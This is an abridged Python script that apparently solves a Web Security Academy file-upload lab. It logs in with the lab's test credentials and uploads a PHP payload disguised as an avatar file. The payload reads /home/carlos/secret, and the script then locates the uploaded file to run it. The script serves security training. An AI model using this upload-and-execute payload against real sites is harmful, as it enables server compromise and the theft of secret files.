...
url = "https://0acf004b04f0794f800635b300bd00b6.web-security-academy.net"
user = "wiener"
password = "peter"
...
def exploit_file_upload(s,  url):
    ...
    if 'Log out' in res.text:
        ...
        # Upload PHP payload
        params = {"avatar": ('payload.test', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/octet-stream'),
        "user": user,
        "csrf": csrf_token}
        ...
        url_to_payload = url + '/files/avatars/payload.test'
